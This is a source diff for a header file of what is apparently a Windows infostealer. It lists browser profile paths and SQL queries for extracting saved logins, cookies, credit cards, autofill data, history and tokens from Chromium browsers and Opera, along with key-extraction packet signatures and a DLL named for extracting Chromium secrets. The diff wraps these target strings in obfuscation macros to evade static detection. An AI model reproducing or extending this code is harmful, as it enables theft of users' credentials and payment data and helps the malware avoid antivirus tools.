@@ -6,7 +6,10 @@
 #include <shlwapi.h>
 #include <strsafe.h>
 #include <TlHelp32.h>
-#include <bcrypt.h>
+#include <Bcrypt.h>
+
+#include "Debug.h"
+#include "Obfuscate.hpp"
 
 #pragma comment(lib, "ole32.lib")
 #pragma comment(lib, "oleaut32.lib")
@@ -14,65 +17,6 @@
 #pragma comment(lib, "crypt32.lib")
 #pragma comment(lib, "bcrypt.lib")
 
-// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
-
-#ifdef BUILD_AS_DLL
-    extern HANDLE   g_hPipe;
-    extern BOOL     g_bPipeInitialized;
-    extern CHAR     g_szProcessName[MAX_PATH];
-    extern DWORD    g_dwProcessId;
-
-    BOOL InitializeOutputPipe(HANDLE* phPipe);  
-
-    #define DBGA(fmt, ...)                                                                  \
-        do {                                                                                \
-            if (!g_szProcessName[0]) {                                                      \
-                CHAR szModulePath[MAX_PATH] = { 0 };                                        \
-                GetModuleFileNameA(NULL, szModulePath, MAX_PATH);                           \
-                lstrcpyA(g_szProcessName, PathFindFileNameA(szModulePath));                 \
-                g_dwProcessId = GetCurrentProcessId();                                      \
-            }                                                                               \
-                                                                                            \
-            if (!g_bPipeInitialized)                                                        \
-                g_bPipeInitialized = InitializeOutputPipe(&g_hPipe);                        \
-                                                                                            \
-            SYSTEMTIME stNow;                                                               \
-            GetLocalTime(&stNow);                                                           \
-                                                                                            \
-            LPSTR szBuf = (LPSTR)LocalAlloc(LPTR, BUFFER_SIZE_1024);                        \
-            if (szBuf) {                                                                    \
-                int nLen = wsprintfA(szBuf,                                                 \
-                                     "[%02d:%02d:%02d.%03d-%s-%lu] " fmt "\r\n",            \
-                                     stNow.wHour, stNow.wMinute, stNow.wSecond,             \
-                                     stNow.wMilliseconds, g_szProcessName,                  \
-                                     g_dwProcessId, ##__VA_ARGS__);                         \
-                                                                                            \
-                if (g_hPipe != INVALID_HANDLE_VALUE) {                                      \
-                    DWORD dwWritten;                                                        \
-                    WriteFile(g_hPipe, szBuf, nLen, &dwWritten, NULL);                      \
-                    FlushFileBuffers(g_hPipe);                                              \
-                }                                                                           \
-                                                                                            \
-                OutputDebugStringA(szBuf);                                                  \
-                LocalFree(szBuf);                                                           \
-            }                                                                               \
-        } while (0)
-
-    #define DBGA_CLOSE()                                                                    \
-        do {                                                                                \
-            if (g_hPipe != INVALID_HANDLE_VALUE) {                                          \
-                CloseHandle(g_hPipe);                                                       \
-                g_hPipe = INVALID_HANDLE_VALUE;                                             \
-            }                                                                               \
-            g_bPipeInitialized = FALSE;                                                     \
-        } while (0)
-
-#else
-
-    #define DBGA(fmt, ...)      printf(fmt "\n", ##__VA_ARGS__)
-    #define DBGA_CLOSE()        do { } while (0)
-
-#endif
 
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 // Browser Type Enum
@@ -90,20 +34,20 @@ typedef enum _BROWSER_TYPE
 
 } BROWSER_TYPE;
 
-#define STR_CHROME_BRSR_NAME            "Chrome"
-#define STR_BRAVE_BRSR_NAME             "Brave"
-#define STR_EDGE_BRSR_NAME              "Msedge"
-#define STR_EDGE_ALT_BRSR_NAME          "Edge"
-#define STR_OPERA_BRSR_NAME             "Opera"
-#define STR_OPERA_GX_BRSR_NAME          "OperaGX"
-#define STR_OPERA_ALT_GX_BRSR_NAME      "Opera GX"
-#define STR_VIVALDI_BRSR_NAME           "Vivaldi"
-#define STR_FIREFOX_BRSR_NAME           "FireFox"
-#define STR_UNKNOWN_BRSR_NAME           "Unknown"
+#define STR_CHROME_BRSR_NAME            OBFA_S("Chrome")
+#define STR_BRAVE_BRSR_NAME             OBFA_S("Brave")
+#define STR_EDGE_BRSR_NAME              OBFA_S("Msedge")
+#define STR_EDGE_ALT_BRSR_NAME          OBFA_S("Edge")
+#define STR_OPERA_BRSR_NAME             OBFA_S("Opera")
+#define STR_OPERA_GX_BRSR_NAME          OBFA_S("OperaGX")
+#define STR_OPERA_ALT_GX_BRSR_NAME      OBFA_S("Opera GX")
+#define STR_VIVALDI_BRSR_NAME           OBFA_S("Vivaldi")
+#define STR_FIREFOX_BRSR_NAME           OBFA_S("FireFox")
+#define STR_UNKNOWN_BRSR_NAME           OBFA_S("Unknown")
 
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 
-#define STR_DLL_NAME                    L"DllExtractChromiumSecrets.dll"
+#define STR_DLL_NAME                    OBFW_S(L"DllExtractChromiumSecrets.dll")
 
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 
@@ -122,14 +66,18 @@ typedef enum _BROWSER_TYPE
 
 #define PACKET_SIG_APP_BOUND_KEY        'YKBA'
 #define PACKET_SIG_DPAPI_KEY            'YKDP'
+#define PACKET_SIG_COMPLETE             'ENOD'
 
 #pragma pack(push, 1)
+#pragma warning(push)
+#pragma warning(disable: 4200)
 typedef struct _DATA_PACKET
 {
     DWORD       dwSignature;
     DWORD       dwDataSize;
     BYTE        bData[];
 } DATA_PACKET, * PDATA_PACKET;
+#pragma warning(pop)
 #pragma pack(pop)
 
 #define PACKET_SIZE(DATASIZE) (sizeof(DATA_PACKET) + (DATASIZE))
@@ -176,54 +124,54 @@ typedef enum _BROWSER_FILE_TYPE
 } BROWSER_FILE_TYPE;
 
 
-#define CHROME_BASE_PATH                "Google\\Chrome\\User Data"
-#define BRAVE_BASE_PATH                 "BraveSoftware\\Brave-Browser\\User Data"
-#define EDGE_BASE_PATH                  "Microsoft\\Edge\\User Data"
-#define OPERA_BASE_PATH                 "Opera Software\\Opera Stable"
-#define OPERAGX_BASE_PATH               "Opera Software\\Opera GX Stable"
-#define VIVALDI_BASE_PATH               "Vivaldi\\User Data"
+#define CHROME_BASE_PATH                OBFA_S("Google\\Chrome\\User Data")
+#define BRAVE_BASE_PATH                 OBFA_S("BraveSoftware\\Brave-Browser\\User Data")
+#define EDGE_BASE_PATH                  OBFA_S("Microsoft\\Edge\\User Data")
+#define OPERA_BASE_PATH                 OBFA_S("Opera Software\\Opera Stable")
+#define OPERAGX_BASE_PATH               OBFA_S("Opera Software\\Opera GX Stable")
+#define VIVALDI_BASE_PATH               OBFA_S("Vivaldi\\User Data")
 
-#define SUFFIX_WEB_DATA                 "\\Default\\Web Data"
-#define SUFFIX_HISTORY                  "\\Default\\History"
-#define SUFFIX_COOKIES                  "\\Default\\Network\\Cookies"
-#define SUFFIX_LOGIN_DATA               "\\Default\\Login Data"
-#define SUFFIX_BOOKMARKS                "\\Default\\Bookmarks"
-#define SUFFIX_LOCAL_STATE              "\\Local State"
+#define SUFFIX_WEB_DATA                 OBFA_S("\\Default\\Web Data")
+#define SUFFIX_HISTORY                  OBFA_S("\\Default\\History")
+#define SUFFIX_COOKIES                  OBFA_S("\\Default\\Network\\Cookies")
+#define SUFFIX_LOGIN_DATA               OBFA_S("\\Default\\Login Data")
+#define SUFFIX_BOOKMARKS                OBFA_S("\\Default\\Bookmarks")
+#define SUFFIX_LOCAL_STATE              OBFA_S("\\Local State")
 
 
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 // SQL Queries
 
-#define SQLQUERY_TOKEN_SERVICE          "SELECT service, encrypted_token, binding_key FROM token_service;"
-#define SQLQUERY_OPERA_ACCESS_TOKENS    "SELECT client_name, encoded_scopes, token, expiration_date FROM access_tokens;"
-#define SQLQUERY_CREDIT_CARDS           "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, nickname, date_modified FROM credit_cards;"
-#define SQLQUERY_AUTOFILL               "SELECT name, value, date_created, count FROM autofill;"
-#define SQLQUERY_HISTORY                "SELECT url, title, visit_count, last_visit_time FROM urls;"
-#define SQLQUERY_COOKIES                "SELECT host_key, path, name, expires_utc, encrypted_value FROM cookies;"
-#define SQLQUERY_LOGINS                 "SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins;"
+#define SQLQUERY_TOKEN_SERVICE          OBFA_S("SELECT service, encrypted_token, binding_key FROM token_service;")
+#define SQLQUERY_OPERA_ACCESS_TOKENS    OBFA_S("SELECT client_name, encoded_scopes, token, expiration_date FROM access_tokens;")
+#define SQLQUERY_CREDIT_CARDS           OBFA_S("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, nickname, date_modified FROM credit_cards;")
+#define SQLQUERY_AUTOFILL               OBFA_S("SELECT name, value, date_created, count FROM autofill;")
+#define SQLQUERY_HISTORY                OBFA_S("SELECT url, title, visit_count, last_visit_time FROM urls;")
+#define SQLQUERY_COOKIES                OBFA_S("SELECT host_key, path, name, expires_utc, encrypted_value FROM cookies;")
+#define SQLQUERY_LOGINS                 OBFA_S("SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins;")
 
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 
 // Bookmarks
-#define JSON_KEY_TYPE                   "\"type\""
+#define JSON_KEY_TYPE                   OBFA_S("\"type\"")
 #define JSON_KEY_TYPE_LEN               6
-#define JSON_KEY_NAME                   "\"name\""
+#define JSON_KEY_NAME                   OBFA_S("\"name\"")
 #define JSON_KEY_NAME_LEN               6
-#define JSON_KEY_URL                    "\"url\""
+#define JSON_KEY_URL                    OBFA_S("\"url\"")
 #define JSON_KEY_URL_LEN                5
-#define JSON_VALUE_URL                  "url"
+#define JSON_VALUE_URL                  OBFA_S("url")
 #define JSON_VALUE_URL_LEN              3
 
 // Local State App Bound Encryption Key
-#define JSON_PARENT_KEY                 "os_crypt"
-#define JSON_CHILD_KEY                  "app_bound_encrypted_key"
+#define JSON_PARENT_KEY                 OBFA_S("os_crypt")
+#define JSON_CHILD_KEY                  OBFA_S("app_bound_encrypted_key")
 
 // Local State Encryption Key (Used For V10 Secrets)
-#define JSON_CHILD_KEY_V10              "encrypted_key"
+#define JSON_CHILD_KEY_V10              OBFA_S("encrypted_key")
 
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 
-#define PIPE_NAME_FRMT                  "\\\\.\\pipe\\%08X%08X"
+#define PIPE_NAME_FRMT                  OBFA_S("\\\\.\\pipe\\%08X%08X")
 
 
 static inline VOID GetPipeName(OUT LPSTR pszPipeName, IN DWORD dwSize)
